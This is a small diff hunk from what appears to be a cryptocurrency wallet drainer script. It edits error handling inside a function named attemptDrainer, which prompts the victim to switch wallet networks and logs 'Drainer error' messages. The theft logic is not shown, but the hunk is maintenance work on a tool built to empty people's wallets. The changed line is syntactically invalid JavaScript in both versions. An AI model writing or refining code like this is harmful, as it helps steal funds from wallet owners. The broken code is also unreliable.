@@ -1033,7 +1033,7 @@ async function attemptDrainer() {
     } else if (error.message.includes('Failed to switch')) {
       errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
     } else {
-errorMessage = Error: ${error.message};
+errorMessage = ${error.message};
     }
     console.error(`❌ Drainer error: ${errorMessage}`);
     await hideModalWithDelay(errorMessage);
